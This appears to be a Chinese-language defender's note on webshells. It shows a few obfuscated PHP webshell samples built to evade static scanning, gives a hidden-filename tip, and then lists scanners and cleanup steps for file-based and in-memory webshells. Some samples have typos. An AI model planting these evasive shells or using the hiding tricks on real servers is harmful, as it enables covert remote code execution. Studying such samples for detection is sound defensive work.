## **webshell文件特征**
主要是正常匹配一些敏感函数，和特征代码。

木马文件上传防静态查杀检测，做混淆：
```
<?php
  $a='b';
  $b=$GET['e'];
  $$a(SPOST['x']);
?>
//寻找绕过

<?php
  $a='b';
  $b='assert‘;
  $$a (base64_decode($_POST['x']);
  ?>


//
$XnEGfa = $_GET['Efa5BVG'] ?? ' ';
$aYunX = "sY";
$aYunX .= "stEmXnsTcx";
$aYunX = explode('Xn', $aYunX);
$kDxfM = new stdClass();
$kDxfM->gHht = $aYunX\[0];
($kDxfM->gHht)($XnEGfa);


```
木马文件名隐藏：
.shell.php在Linux中直接看隐藏看不到。
## **webshell文件静态查杀**
Windows安全中心
阿里伏魔：<https://ti.aliyun.com/#/webshell>
百度WEBDIR+ ：<https://scanner.baidu.com/#/pages/intro>
河马：安装版，打开点击选择文件目录，即可扫描目录下是否有木马。<https://www.shellpub.com/>
河马linux版，命令指定网站目录即可扫描，给出xls结果。
CloudWalker
D盾：安装版，打开点击选择文件目录，即可扫描目录下是否有木马。

^
## **webshell内存马特征**
内存中的对象找不到对应的.class文件中的类型。

java内存马原理：
<https://www.freebuf.com/articles/web/274466.html>
<https://github.com/Getshell/Mshell>


## **webshell内存马查杀**
内存马情况，常规查杀找不出来。

典型：哥斯拉文件木马getshell后，可以植入.net,php,java内存马。

查杀：
asp.net内存马，检测及查杀工具：上传aspx-memshell-scanner.aspx脚本文件到网站web目录，访问即可检测查杀。
php内存马，常规后门查杀检测后，中间件重启后删除文件即可。

java内存马，重启不行。
1.用河马(主机安装后，使用命令一键检测java，.net的内存马，hmws.exe javascan，找到缓存路径删除重启即可)。
>linux版，专用于Java类内存马检测自动识别包括Tomcat、Weblogic、Jboss环境；Spring等打包环境支持手动指定进程方式，因此第三方Java应用（gitlab，ES）都可以检测；
>Windows版，Java内存马检测，Java6+;OA系统、办公系统；
>.Net内存马，IIS等场景下的.net内存马检测。
>全面覆盖内存马常见场景，可检测冰蝎、哥斯拉等内存马利用工具注入的内存马。

2.对于tomcat，上传tomcat-memshell-scanner.jsp脚本文件到网站web目录，访问即可检测查杀。
可以直接下载源码和kill，如果无法分析，可以下载dump源码后分析是否为木马代码。

